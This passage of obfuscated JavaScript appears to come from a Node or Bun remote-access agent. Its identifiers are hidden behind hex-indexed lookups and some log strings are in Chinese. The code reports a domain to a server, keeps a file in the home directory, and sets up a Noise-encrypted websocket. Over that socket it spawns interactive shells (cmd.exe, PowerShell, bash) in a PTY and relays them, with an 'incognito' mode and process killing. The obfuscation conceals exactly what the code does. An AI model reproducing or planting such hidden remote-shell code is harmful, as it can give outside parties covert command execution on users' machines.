                            'hostname': s['hostname'],
                            'port': s[jY(0xae3)] || 0x1bb,
                            'path': b[jY(0xb97)](s[jY(0x38a)], s['search']),
                            'method': p,
                            'headers': {
                                'Content-Type': jY(0x133) + j,
                                'Content-Length': o ? o[jY(0xed)] : 0x0,
                                'User-Agent': b[jY(0x6fd)]
                            }
                        }, v => {
                            const k0 = jY;
                            v[k0(0x364)](), v['on'](r['CVIRt'], () => q(v['statusCode']));
                        });
                    t['on'](b[jY(0x7df)], v => {
                        const k1 = jY;
                        d(r['BcJlJ'](r[k1(0x391)](p + '\x20', n) + r[k1(0x66e)], v[k1(0x8f9)])), q(0x0);
                    }), t[jY(0x7da)](0x7530, () => t[jY(0x3d8)](new Error(jY(0xc1e))));
                    if (o)
                        t['write'](o);
                    t[jY(0xa40)]();
                };
            b['wXBNl'](d, b[jV(0xb97)](b[jV(0x4eb)](b['XkLfK'](b[jV(0x54f)](b[jV(0x71c)], h), jV(0x90d)), b['UcMwO'](i['length'], 0x0)), ')'));
            try {
                b[jV(0xa97)](m, b[jV(0xb85)], b[jV(0x227)](l, k), b[jV(0x4f8)], n => {
                    const k2 = jV;
                    b[k2(0xd26)](d, b[k2(0xc17)](b['fJNvp'], n));
                    if (b[k2(0x5d2)](n, 0x199)) {
                        b[k2(0x2fb)](d, b[k2(0xc17)](b[k2(0xb97)](b[k2(0xd37)], h), ':*'));
                        const o = k[k2(0x29a)](([p]) => p !== 'n');
                        b[k2(0xbd2)](m, k2(0x6c1) + h + ':' + i, l(o), k2(0x1da), p => {
                            const k3 = k2;
                            g[k3(0x905)](d, g[k3(0x17c)](g['GBTKi'](g[k3(0xb55)], p), p === 0xc8 ? g[k3(0x993)] : k3(0x266))), f(g['qxciH'](p, 0xc8));
                        });
                    } else
                        n === 0xc8 ? (b[k2(0x7ee)](d, b['nNGaU']), b[k2(0x2c6)](f, !![])) : (d(b['XkLfK'](b[k2(0xb97)](b['IfHgy'], n), ')')), f(![]));
                });
            } catch (n) {
                b[jV(0x7ee)](d, b[jV(0xc17)](b[jV(0xa60)], n[jV(0x8f9)])), b['LMggW'](f, ![]);
            }
        })[jS(0x532)](f => {
            const k4 = jS;
            if (f)
                this[k4(0x21e)] = a;
            return f;
        })[jS(0x818)](() => ![]);
    }
    static async ['reportDomainChange'](a) {
        const k5 = a0ch, b = {
                'NbVIw': function (c, d) {
                    return c <= d;
                }
            };
        for (let c = 0x1; b[k5(0xa74)](c, 0x3); c++) {
            if (await this[k5(0x954)](a))
                return;
            c < 0x3 && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0ch(0xbd1)]() {
        const k6 = a0ch, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[k6(0x8d6)](b) && a0l[k6(0x4e2)](b)[k6(0x60e)]())
                return b;
        }
        try {
            return a0p[k6(0xc80)]();
        } catch (c) {
            return process[k6(0x72b)]();
        }
    }
    static ['resolveDomainFilePath']() {
        const k7 = a0ch, a = {
                'RWcaS': k7(0xb49),
                'gFHku': k7(0x786),
                'zFFwO': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0a1[k7(0x2c1)] || '')[k7(0x40e)]();
        if (!b)
            return a0o[k7(0xaa7)](this['homeDir'](), a[k7(0x3be)]);
        if (b[k7(0xc9b)](a['gFHku']))
            b = a[k7(0xd30)](b[k7(0xed)], 0x5) ? a0o[k7(0xaa7)](this[k7(0xbd1)](), b[k7(0x88a)](0x5)['replace'](/^[/\\]+/, '')) : this[k7(0xbd1)]();
        else
            b[k7(0xc9b)]('~') && (b = a0o[k7(0x6ad)](b['replace'](/^~(?=[/\\]|$)/, this[k7(0xbd1)]())));
        return b;
    }
    static [a0ch(0x3c8)](a) {
        const k8 = a0ch;
        this[k8(0x21e)] = a;
        const b = this[k8(0xcbe)]();
        try {
            a0l['mkdirSync'](a0o[k8(0x651)](a0o[k8(0x6ad)](b)), { 'recursive': !![] }), a0l[k8(0x134)](b, a), a0P['info'](k8(0xad3) + b);
        } catch (c) {
            a0P[k8(0x4fe)](k8(0x261) + b + k8(0x465) + c[k8(0x8f9)]);
        }
    }
    static [a0ch(0x86e)]() {
        const k9 = a0ch, a = this[k9(0xcbe)]();
        try {
            a0l[k9(0x8d6)](a) && a0l[k9(0x4e2)](a)[k9(0xbdd)]() && (a0l['unlinkSync'](a), a0P[k9(0x1b1)](k9(0x454) + a));
        } catch (b) {
            a0P[k9(0x4fe)](k9(0xc15) + a + k9(0x465) + b[k9(0x8f9)]);
        }
    }
    static [a0ch(0x996)]() {
        const ka = a0ch;
        !this['_baseinfoHooked'] && (this['_baseinfoHooked'] = !![], this[ka(0x86e)]());
    }
    static ['startStdinListener']() {
        const kb = a0ch, a = {
                'gQSin': '/domain',
                'YWnqO': kb(0xaaa),
                'YWLTa': kb(0x4f7)
            };
        try {
            const b = a0q[kb(0xb6a)]({
                'input': process['stdin'],
                'terminal': ![]
            });
            b['on']('line', c => {
                const kc = kb;
                c['trim']() === a[kc(0xc06)] && console[kc(0x215)](this['_domain'] || a['YWnqO']);
            }), b['on'](a[kb(0xbf6)], () => {
            }), b['on'](kb(0xb4f), () => {
            });
        } catch (c) {
        }
    }
    static [a0ch(0x2be)](a) {
        const kd = a0ch, b = {
                'wTHEy': function (c, d) {
                    return c === d;
                },
                'XkMMN': function (c, d) {
                    return c === d;
                },
                'HvuaW': function (c, d) {
                    return c + d;
                },
                'HjTlQ': kd(0x4c8),
                'KBmhG': kd(0x319)
            };
        if (b[kd(0x3c4)](a0a1['KMODE'], '2') && this[kd(0xb84)]()) {
            const c = b[kd(0x5e6)](a0a1[kd(0x426)], !![]);
            a0P[kd(0x1b1)](b['HvuaW'](kd(0x917), c ? 'q' : '') + b[kd(0x3d2)] + (c ? b[kd(0x208)] : '')), a['onDomainChange'] = (d, f) => {
                this['reportDomainChange'](f);
            }, a[kd(0xc6c)](a0a1[kd(0x5f8)], ![], c)[kd(0x532)](d => this['reportShzal'](d[kd(0xa13)]))[kd(0x818)](() => {
            });
            return;
        }
        a0P[kd(0x1b1)](kd(0xc34)), a[kd(0x82f)] = (d, f) => {
            this['writeDomainFile'](f);
        }, a[kd(0xc6c)](a0a1[kd(0x5f8)])[kd(0x532)](d => {
            const ke = kd;
            this['writeDomainFile'](d[ke(0xa13)]);
        })['catch'](d => {
            const kf = kd;
            a0P[kf(0x4fe)](kf(0x85f) + d[kf(0x8f9)]);
        }), this[kd(0xd68)]();
    }
}
let a0c6 = null, a0c7 = null;
const a0c8 = new Promise((a, b) => {
    const kg = a0ch, c = {
            'sYZQR': kg(0x8e5),
            'hJPHG': kg(0xc97),
            'CBFSC': function (d) {
                return d();
            },
            'zapiX': function (d) {
                return d();
            },
            'YcgzM': function (d, f) {
                return d(f);
            }
        };
    try {
        c[kg(0xa0c)](a0y, function (d) {
            const kh = kg;
            if (!d) {
                a0c7 = new Error(c[kh(0x52d)]), a0P[kh(0x4fe)](c[kh(0x253)], a0c7[kh(0x8f9)]), c[kh(0xc6e)](a);
                return;
            }
            a0c6 = d, a0P['debug'](kh(0x52a)), c[kh(0x9ad)](a);
        });
    } catch (d) {
        a0c7 = d, a0P[kg(0x4fe)](kg(0x116), d[kg(0x8f9)]), c['zapiX'](a);
    }
});
process['on'](a0ch(0xcf1), (a, b) => {
    const ki = a0ch, c = { 'EgaCr': ki(0x27d) };
    a0P[ki(0xb4f)](c[ki(0x732)], a);
}), process['on'](a0ch(0x88f), a => {
    const kj = a0ch, b = { 'ZMGjJ': kj(0x8f7) };
    a0P[kj(0xb4f)](b[kj(0x6a5)], a), process[kj(0xadd)](0x1);
});
class a0c9 {
    constructor(a, b, c) {
        const kk = a0ch;
        this[kk(0x647)] = a, this[kk(0x99d)] = b, this[kk(0x75f)] = c, this[kk(0x739)] = ![], this['hs'] = null, this[kk(0x5fd)] = null, this[kk(0xd53)] = null;
    }
    async [a0ch(0x994)]() {
        const kl = a0ch, a = {
                'wKCly': kl(0x31f),
                'QqUNa': kl(0x7a4),
                'jxtnH': 'base64'
            };
        await a0c8;
        if (!a0c6)
            throw a0c7 || new Error(kl(0x6d5));
        const b = a0c6, c = this[kl(0x647)] ? b[kl(0x6aa)][kl(0x148)] : b[kl(0x6aa)][kl(0xd4c)];
        this['hs'] = b[kl(0xbb2)](a[kl(0x6ca)], c);
        const d = Buffer['from'](a[kl(0x298)]), f = this['localPrivB64'] ? Buffer['from'](this[kl(0x99d)], a['jxtnH']) : null, g = this[kl(0x75f)] ? Buffer['from'](this[kl(0x75f)], a[kl(0xd1f)]) : null;
        this['hs'][kl(0x450)](d, f, g, null);
    }
    ['processHandshake'](a) {
        const km = a0ch, b = {
                'GlkIU': function (d, f) {
                    return d > f;
                },
                'CDDyX': function (d, f) {
                    return d === f;
                }
            };
        if (this[km(0x739)])
            return Buffer['alloc'](0x0);
        const c = a0c6;
        a && b[km(0x7f0)](a[km(0xed)], 0x0) && b[km(0x27a)](this['hs']['GetAction'](), c[km(0x6aa)][km(0x193)]) && this['hs'][km(0x83b)](a);
        if (this['hs']['GetAction']() === c[km(0x6aa)][km(0x98d)])
            return this['_splitAndFinish'](), Buffer[km(0x9e7)](0x0);
        if (b[km(0x27a)](this['hs'][km(0x9b9)](), c[km(0x6aa)]['NOISE_ACTION_WRITE_MESSAGE'])) {
            const d = this['hs'][km(0xb86)](new Uint8Array(0x0));
            return b['CDDyX'](this['hs'][km(0x9b9)](), c[km(0x6aa)][km(0x98d)]) && this['_splitAndFinish'](), Buffer[km(0x8c2)](d);
        }
        return Buffer[km(0x9e7)](0x0);
    }
    [a0ch(0x1ca)]() {
        const kn = a0ch, a = { 'oCwWT': 'base64' };
        let b = null;
        try {
            b = this['hs'][kn(0x1d8)]();
        } catch (g) {
            b = null;
        }
        const c = this[kn(0x75f)] ? Buffer[kn(0x8c2)](this[kn(0x75f)], a[kn(0x384)]) : null, d = b && c && b[kn(0xed)] === c[kn(0xed)] && a0k[kn(0x619)](Buffer[kn(0x8c2)](b), c);
        if (!d)
            throw new Error(kn(0x8cc));
        const f = this['hs'][kn(0x34a)]();
        this[kn(0x5fd)] = f[0x0], this[kn(0xd53)] = f[0x1], this[kn(0x739)] = !![];
        try {
            if (this['hs'])
                this['hs']['free']();
        } catch (h) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const ko = a0ch, b = { 'vJfpJ': '握手未完成，无法加密数据' };
        if (!this[ko(0x739)])
            throw new Error(b[ko(0xa54)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[ko(0x8c2)](this[ko(0x5fd)][ko(0x73f)](c, d));
    }
    ['decrypt'](a) {
        const kp = a0ch, b = { 'QpQGg': kp(0x4bd) };
        if (!this[kp(0x739)])
            throw new Error(b[kp(0x813)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[kp(0x8c2)](this[kp(0xd53)][kp(0xcfd)](c, d));
    }
    [a0ch(0x2a3)]() {
        const kq = a0ch;
        try {
            if (this['sendCipher'])
                this[kq(0x5fd)]['free']();
        } catch (a) {
        }
        try {
            if (this[kq(0xd53)])
                this[kq(0xd53)][kq(0x2a3)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][kq(0x2a3)]();
        } catch (c) {
        }
        this['sendCipher'] = null, this[kq(0xd53)] = null, this['hs'] = null;
    }
}
class a0ca {
    constructor(a, b, c, d) {
        const kr = a0ch;
        this[kr(0xbc4)] = a, this[kr(0xc1a)] = b, this['cwd'] = c, this[kr(0x972)] = d || [], this[kr(0x7d4)] = null, this[kr(0x709)] = 0x0, this[kr(0x401)] = null, this[kr(0xd60)] = null;
    }
    [a0ch(0x66c)]() {
        const ks = a0ch, a = {
                'onfZr': function (c, d) {
                    return c || d;
                },
                'xnSGm': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'QlDWa': ks(0xa7f),
                'roruH': 'data'
            };
        this[ks(0x7d4)] = a[ks(0x2fc)](a0s, this[ks(0xbc4)], this['args'], {
            'env': this[ks(0xc1a)],
            'cwd': this[ks(0x72b)],
            'windowsHide': !![],
            'stdio': [
                a['QlDWa'],
                a[ks(0xce1)],
                ks(0xa7f)
            ]
        }), this['pid'] = this[ks(0x7d4)]['pid'] || 0x0;
        const b = this;
        this[ks(0x7d4)]['stdout']['on'](ks(0x649), c => b[ks(0xd48)](c)), this[ks(0x7d4)][ks(0x59e)]['on'](a[ks(0x425)], c => b[ks(0xd48)](c)), this[ks(0x7d4)]['on'](ks(0xadd), (c, d) => {
            const kt = ks;
            if (b[kt(0xd60)])
                b[kt(0xd60)]({
                    'exitCode': c,
                    'signal': a[kt(0x8f8)](d, null)
                });
        });
    }
    [a0ch(0xd48)](a) {
        const ku = a0ch, b = { 'ROCNk': ku(0x5ad) };
        if (this[ku(0x401)])
            this[ku(0x401)](a[ku(0x1d9)](b['ROCNk']));
    }
    [a0ch(0x478)](a) {
        const kv = a0ch;
        return this[kv(0x401)] = a, {
            'dispose': () => {
                const kw = kv;
                this[kw(0x401)] = null;
            }
        };
    }
    ['onExit'](a) {
        const kx = a0ch;
        return this[kx(0xd60)] = a, {
            'dispose': () => {
                const ky = kx;
                this[ky(0xd60)] = null;
            }
        };
    }
    [a0ch(0x92a)](a) {
        const kz = a0ch;
        if (!this['proc'] || !this['proc']['stdin'])
            return;
        try {
            this[kz(0x7d4)][kz(0x2b2)][kz(0x92a)](a);
        } catch (b) {
        }
    }
    [a0ch(0x121)]() {
    }
    ['kill']() {
        const kA = a0ch;
        try {
            if (this[kA(0x7d4)])
                this[kA(0x7d4)][kA(0x387)]();
        } catch (a) {
        }
    }
}
class a0cb {
    constructor() {
        const kB = a0ch, a = {
                'tScDz': kB(0x278),
                'GSCSc': kB(0xa6b)
            }, b = a[kB(0x294)][kB(0xbb0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[kB(0x4f2)] = ![];
                continue;
            case '1':
                this['incognitoRequested'] = ![];
                continue;
            case '2':
                this['requestId'] = null;
                continue;
            case '3':
                this['websocket'] = null;
                continue;
            case '4':
                this[kB(0x47c)] = [];
                continue;
            case '5':
                this[kB(0x414)] = a0a1[kB(0x973)][kB(0x355)][kB(0xb17)];
                continue;
            case '6':
                this[kB(0x765)] = a0a1[kB(0x973)]['agent'][kB(0xb4e)];
                continue;
            case '7':
                this['useNoise'] = !![];
                continue;
            case '8':
                this[kB(0x79f)] = a[kB(0x6ae)];
                continue;
            case '9':
                this['msgQueue'] = [];
                continue;
            case '10':
                this['cipher'] = new a0c9(![], this[kB(0x765)], this[kB(0x414)]);
                continue;
            case '11':
                this['ptyProcess'] = null;
                continue;
            }
            break;
        }
    }
    async [a0ch(0xd49)]() {
        const kC = a0ch, a = {
                'RkMuI': function (b, c) {
                    return b === c;
                },
                'LAUOv': 'win32',
                'XvwAG': function (b, c) {
                    return b === c;
                },
                'jjkAu': kC(0x708)
            };
        this[kC(0xaec)] && a0P[kC(0x1b1)]('[' + this[kC(0xaec)] + kC(0x3de));
        if (this['ptyProcess']) {
            a[kC(0x7b1)](process[kC(0xa65)], a[kC(0x448)]) && this[kC(0x843)][kC(0x709)] && this[kC(0xd38)](this['ptyProcess'][kC(0x709)]);
            try {
                this[kC(0x843)][kC(0x387)]();
            } catch (b) {
            }
            this[kC(0x843)] = null;
        }
        if (this[kC(0x2fa)])
            this[kC(0x2fa)][kC(0x2a3)]();
        if (this[kC(0xcfe)])
            try {
                a[kC(0x567)](this['websocket']['readyState'], this[kC(0xcfe)][kC(0xb69)]) && this[kC(0xcfe)][kC(0x4f7)](0x3e8, a[kC(0x1bc)]);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0ch(0xd38)](a) {
        const kD = a0ch, b = {
                'kOgWU': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[kD(0x1dd)](a0r, 'taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0ch(0x978)](a) {
        const kE = a0ch, b = {
                'tiJbJ': function (c, d) {
                    return c === d;
                },
                'LcTVc': kE(0xa6b),
                'Rrkhj': function (c, d) {
                    return c > d;
                },
                'LclCB': function (c, d) {
                    return c(d);
                },
                'JxgxZ': kE(0xa4d)
            };
        if (b[kE(0xd45)](this['phase'], b['LcTVc'])) {
            if (b[kE(0x25c)](this['msgResolvers'][kE(0xed)], 0x0)) {
                const c = this['msgResolvers'][kE(0xaa5)]();
                b[kE(0xc1f)](c, a);
            } else
                this[kE(0xc2d)][kE(0x77f)](a);
        } else
            this[kE(0x79f)] === b[kE(0x3e8)] && this[kE(0x472)](a);
    }
    async [a0ch(0xb51)]() {
        const kF = a0ch, a = {
                'YIvtT': function (b, c) {
                    return b > c;
                }
            };
        if (a['YIvtT'](this[kF(0xc2d)][kF(0xed)], 0x0))
            return this['msgQueue'][kF(0xaa5)]();
        return new Promise(b => {
            const kG = kF;
            this['msgResolvers'][kG(0x77f)](b);
        });
    }
    async [a0ch(0x2ed)](a) {
        const kH = a0ch, b = {
                'cdXRq': function (c, d) {
                    return c(d);
                },
                'bddGP': kH(0x8a4),
                'YGuDJ': kH(0x4d1),
                'RBdZJ': kH(0x9d6),
                'DBctV': kH(0x882)
            };
        b[kH(0x5c1)](a, b[kH(0x9ea)]);
        try {
            await this[kH(0x2fa)][kH(0x994)]();
            const c = await this['_receiveWsBytes'](), d = this[kH(0x2fa)]['processHandshake'](c);
            d && d[kH(0xed)] > 0x0 && this[kH(0xcfe)][kH(0x6da)](d);
            const f = await this['_receiveWsBytes']();
            this[kH(0x2fa)][kH(0x8d3)](f);
            if (!this['cipher'][kH(0x739)])
                throw new Error(b[kH(0xaac)]);
            a(b['RBdZJ']);
        } catch (g) {
            a(kH(0x6d3) + g['message']);
            throw new Error(b[kH(0xb95)]);
        }
    }
    [a0ch(0x1b8)]() {
        const kI = a0ch, a = {
                'zySnd': 'C:\x5cWindows',
                'Kvuxj': kI(0x287),
                'EOeKK': kI(0x64b),
                'VyMtC': kI(0x4dd),
                'tjUqM': 'cmd.exe',
                'OPOVp': kI(0x1f9),
                'buTbd': kI(0x106),
                'pNlyt': '/bin/ash'
            };
        if (process[kI(0xa65)] === kI(0x29d)) {
            const d = process.env.SystemRoot || a[kI(0x660)], f = [
                    a0o[kI(0xaa7)](d, kI(0x4dd), kI(0x12a), a[kI(0xc8b)], a[kI(0x826)]),
                    process.env.COMSPEC,
                    a0o['join'](d, a['VyMtC'], a[kI(0x736)])
                ];
            for (const g of f) {
                if (g && a0l[kI(0x8d6)](g))
                    return g;
            }
            return a[kI(0x736)];
        }
        const b = [
            a[kI(0x4c9)],
            a[kI(0x2a7)],
            a[kI(0x8c6)]
        ];
        for (const h of b) {
            if (a0l[kI(0x8d6)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[kI(0x8d6)](c))
            return c;
        return kI(0x50b);
    }
    async ['startSession'](a, b, c, d = ![], f = ![]) {
        const kJ = a0ch, g = {
                'HAAdh': kJ(0x433),
                'WuwSy': kJ(0x357),
                'iqfRM': kJ(0x8f9),
                'ooRgQ': function (i, j) {
                    return i(j);
                }
            };
        this['websocket'] = a, this[kJ(0xaec)] = b, this[kJ(0x4f2)] = d, this[kJ(0x988)] = f;
        const h = i => a0P['info']('[终端会话\x20' + b + ']\x20' + i);
        this[kJ(0x696)] = !c, h(this[kJ(0x696)] ? g['HAAdh'] : g[kJ(0x32d)]), a['on'](g[kJ(0x335)], i => this[kJ(0x978)](i));
        try {
            this['useNoise'] && await this['_doNoiseHandshake'](h), await this['_runTerminal'](h);
        } catch (i) {
            g[kJ(0x36b)](h, kJ(0x5cf) + i[kJ(0x8f9)]), await this['cleanup']();
        }
    }
    async [a0ch(0x161)](a) {
        const kK = a0ch, b = {
                'aqRrf': kK(0x5ad),
                'rWWyn': function (h, i) {
                    return h === i;
                },
                'vIcKG': function (h, i) {
                    return h(i);
                },
                'pdggn': function (h, i) {
                    return h(i);
                },
                'KItLR': kK(0xbc1),
                'NShgx': function (h) {
                    return h();
                },
                'spotv': function (h, i) {
                    return h || i;
                },
                'YFXDG': 'pty\x20实现不可用',
                'Becfa': function (h, i) {
                    return h(i);
                },
                'PwMtg': 'xterm-256color',
                'HBDRq': 'C.UTF-8',
                'lzirG': function (h, i) {
                    return h !== i;
                },
                'Clyxv': kK(0x29d),
                'ITfAo': kK(0x141),
                'LDSqh': function (h, i) {
                    return h === i;
                },
                'wigcp': function (h, i) {
                    return h === i;
                },
                'iVpVT': kK(0xbfe),
                'HLTUg': '-Command',
                'DOxjH': kK(0x8b5),
                'EYSts': function (h) {
                    return h();
                },
                'Zmbfe': function (h, i) {
                    return h === i;
                },
                'WNWmo': kK(0xa4d),
                'EOQid': function (h, i) {
                    return h > i;
                }
            };
        b[kK(0xbda)](process[kK(0xa65)], b[kK(0x79d)]) && typeof Bun === kK(0x85d) && !a0C && !a0D && await b[kK(0x650)](a0O);
        if (!a0C) {
            const h = b['spotv'](a0D, b['YFXDG']);
            b['vIcKG'](a, kK(0x471) + h);
            try {
                this[kK(0xcfe)]['close'](0x3f3, kK(0xc40));
            } catch (i) {
            }
            throw new Error(h);
        }
        const c = this[kK(0x1b8)]();
        b['Becfa'](a, kK(0x9b5) + c);
        const d = Object['assign']({}, process.env);
        delete d[kK(0xba1)], d['TERM'] = b[kK(0xa51)];
        if (!d[kK(0xc89)])
            d['LANG'] = b[kK(0xd04)];
        this[kK(0x988)] && b[kK(0xc36)](process[kK(0xa65)], b[kK(0x611)]) && (d[kK(0xa80)] = b[kK(0xc10)]);
        const f = this[kK(0x988)] && b[kK(0x7ba)](process[kK(0xa65)], b['Clyxv']) && b['wigcp'](a0o['basename'](c)[kK(0xacd)](), kK(0x64b)) ? [
                b[kK(0x528)],
                b[kK(0xb61)],
                b[kK(0x775)]
            ] : [], g = b[kK(0xa75)](a0Q);
        try {
            const j = {
                'name': kK(0x2cb),
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[kK(0x794)](process[kK(0xa65)], b[kK(0x611)]))
                try {
                    this['ptyProcess'] = a0C[kK(0x66c)](c, f, j);
                } catch (k) {
                    a(kK(0x1fa) + k[kK(0x8f9)]), this['ptyProcess'] = new a0ca(c, d, g, f), this[kK(0x843)]['spawn']();
                }
            else
                this[kK(0x843)] = a0C['spawn'](c, f, j);
            b[kK(0xcde)](a, kK(0x9fd) + (this[kK(0x843)][kK(0x709)] || kK(0xa0a)) + ')');
            this[kK(0x4f2)] && this[kK(0x7f3)](c);
            this['phase'] = b[kK(0xb83)];
            while (b[kK(0xc11)](this[kK(0xc2d)]['length'], 0x0)) {
                const l = this[kK(0xc2d)]['shift']();
                this[kK(0x472)](l);
            }
            this[kK(0x843)][kK(0x478)](m => {
                const kL = kK;
                try {
                    let n = Buffer[kL(0x8c2)](m, b['aqRrf']);
                    this[kL(0x696)] && this[kL(0x2fa)] && this['cipher'][kL(0x739)] && (n = this[kL(0x2fa)][kL(0x174)](n)), b[kL(0xbda)](this[kL(0xcfe)][kL(0x1a7)], 0x1) && this[kL(0xcfe)][kL(0x6da)](n);
                } catch (o) {
                }
            }), this['ptyProcess'][kK(0x89a)](({
                exitCode: m,
                signal: n
            }) => {
                const kM = kK;
                b[kM(0xbb6)](a, kM(0x38b) + m + ',\x20Signal:\x20' + n + ')'), this[kM(0xd49)]();
            }), this['websocket']['on'](kK(0x4f7), () => {
                const kN = kK;
                b[kN(0x8c4)](a, kN(0x608)), this[kN(0xd49)]();
            });
        } catch (m) {
            a(kK(0x37e) + m[kK(0x8f9)]), await this['cleanup']();
            throw m;
        }
    }
    static [a0ch(0x867)](a) {
        const kO = a0ch, b = {
                'xzqQl': function (d, f) {
                    return d(f);
                },
                'GcuwY': function (d, f) {
                    return d || f;
                }
            };
        let c = a0o[kO(0xcef)](b[kO(0x411)](String, b['GcuwY'](a, ''))[kO(0x40e)]())['toLowerCase']();
        if (c['endsWith'](kO(0x747)))
            c = c[kO(0x88a)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0ch(0x995)](a) {
        const kP = a0ch, b = {
                'wYmSM': function (c, d) {
                    return c(d);
                },
                'CWxXx': function (c, d) {
                    return c || d;
                },
                'OqkMM': function (c, d) {
                    return c === d;
                },
                'WCHzA': kP(0x64b)
            };
        if (process[kP(0xa65)] === kP(0x29d)) {
            const c = a0o['basename'](b[kP(0xae0)](String, b['CWxXx'](a, '')))[kP(0xacd)]();
            return b[kP(0x699)](c, b[kP(0x398)]) || c === kP(0x799);
        }
        return !![];
    }
    [a0ch(0x7f3)](a) {
        const kQ = a0ch, b = {
                'SYgeD': kQ(0x9f4),
                'sccGG': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer['from'](JSON[kQ(0x70a)]({
                'type': b['SYgeD'],
                'shell': a0cb[kQ(0x867)](a),
                'path': a,
                'incognito': !!(this[kQ(0x988)] && a0cb[kQ(0x995)](a))
            }));
            this['useNoise'] && this[kQ(0x2fa)] && this[kQ(0x2fa)][kQ(0x739)] && (c = this['cipher'][kQ(0x174)](c)), this['websocket'] && b[kQ(0xd3c)](this[kQ(0xcfe)][kQ(0x1a7)], 0x1) && this[kQ(0xcfe)][kQ(0x6da)](c);
        } catch (d) {
        }
    }
    ['_processTerminalMessage'](a) {
        const kR = a0ch, b = {
                'JRpJx': kR(0x463),
                'qsHOP': function (c, d) {
                    return c === d;
                },
                'ssKAF': kR(0x121),
                'PiSax': function (c, d) {
                    return c === d;
                },
                'hHkOv': 'input',
                'KsHvs': 'base64',
                'Loteg': kR(0x5ad)
            };
        if (!this['ptyProcess'])
            return;
        try {
            const c = Buffer[kR(0x8c2)](a);
            let d;
            this[kR(0x696)] ? d = this[kR(0x2fa)][kR(0x89b)](c) : d = c;
            let f = ![], g = d[kR(0x1d9)]('utf-8');
            if (g[kR(0x40e)]()[kR(0xc9b)]('{'))
                try {
                    const h = JSON[kR(0x418)](g);
                    f = !![];
                    if (h['type'] === b['JRpJx']) {
                        let i = Buffer[kR(0x8c2)](JSON['stringify']({ 'type': kR(0x463) }));
                        if (this['useNoise'])
                            i = this[kR(0x2fa)][kR(0x174)](i);
                        this['websocket'][kR(0x6da)](i);
                        return;
                    }
                    if (b[kR(0x654)](h[kR(0x430)], b['ssKAF'])) {
                        this[kR(0x843)][kR(0x121)](h['cols'] || 0x50, h[kR(0xcf9)] || 0x18);
                        return;
                    }
                    if (b[kR(0x469)](h[kR(0x430)], b[kR(0x728)]) && h[kR(0x649)] !== undefined) {
                        let j = b[kR(0x654)](h[kR(0x2fe)], b['KsHvs']) ? Buffer[kR(0x8c2)](h['data'], b[kR(0x437)])['toString'](b[kR(0x959)]) : h[kR(0x649)];
                        this[kR(0x843)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[kR(0x843)][kR(0x92a)](d['toString'](b[kR(0x959)]));
        } catch (l) {
            a0P[kR(0x1b1)]('[终端会话\x20' + this['requestId'] + kR(0x26b) + l[kR(0x8f9)]);
            if (this[kR(0x696)])
                this[kR(0xd49)]();
        }
    }
}
async function a0cc() {
    const kS = a0ch, a = {
            'nUGSQ': '@noble/curves/nist.js',
            'kEPWp': '@noble/curves/secp256k1.js'
        }, b = await import(a[kS(0xc1c)]);
    a0A = b[kS(0x4c6)];
    const c = await import(a[kS(0x66f)]);
    a0B = c[kS(0xd40)];
}
async function a0cd(a = {}) {
    const kT = a0ch, b = {
            'XuMLd': kT(0xbd5),
            'xZIZS': kT(0x5fa),
            'JYwyn': kT(0x7f8),
            'oLSYS': kT(0x3f3),
            'blBlX': kT(0x733),
            'WCgPB': kT(0x5aa),
            'hlCGb': function (c) {
                return c();
            },
            'reTPB': kT(0x93a),
            'GQDIZ': 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS',
            'JOwOm': kT(0x32c),
            'jKHsE': function (c, d) {
                return c === d;
            },
            'SiiGt': function (c, d) {
                return c !== d;
            },
            'wutWt': function (c, d) {
                return c < d;
            },
            'rnChr': kT(0x9be),
            'FBngV': function (c, d) {
                return c === d;
            },
            'QetCw': kT(0x185),
            'erOiG': function (c, d) {
                return c === d;
            },
            'AUCvt': kT(0x13c),
            'BrLba': kT(0xacc),
            'PVMyA': function (c, d) {
                return c(d);
            },
            'KezXM': function (c, d) {
                return c / d;
            },
            'vHTyl': kT(0xb03),
            'rkIPx': function (c, d) {
                return c > d;
            },
            'ilNvk': kT(0x5f1),
            'iIgkk': kT(0xb4f),
            'cjXQM': function (c, d) {
                return c === d;
            },
            'ThPiM': function (c, d) {
                return c(d);
            },
            'QFvqd': kT(0xc8f),
            'LgFic': kT(0x1b9),
            'rEIqM': 'x-chunk-id',
            'ApZeD': function (c, d, f) {
                return c(d, f);
            },
            'rqLWB': function (c, d) {
                return c(d);
            },
            'smFWl': function (c, d) {
                return c !== d;
            },
            'XHnep': function (c, d, f) {
                return c(d, f);
            },
            'BJftA': 'Invalid\x20binary\x20stream\x20request\x20body',
            'TtCLX': kT(0x70b),
            'uWgMR': kT(0xb45),
            'sZAWr': function (c, d) {
                return c > d;
            },
            'XyLhU': function (c, d) {
                return c <= d;
            },
            'smbPz': kT(0xd18),
            'zIkLR': kT(0x464),
            'hleSj': kT(0x762),
            'zxzUA': kT(0x461),
            'hnrCV': function (c, d) {
                return c === d;
            },
            'aveTb': kT(0x11b),
            'OyLwv': function (c, d, f) {
                return c(d, f);
            },
            'HVfSh': function (c, d) {
                return c === d;
            },
            'OtxpV': function (c, d) {
                return c === d;
            },
            'fsMBK': function (c, d) {
                return c === d;
            },
            'OgogD': function (c, d) {
                return c(d);
            },
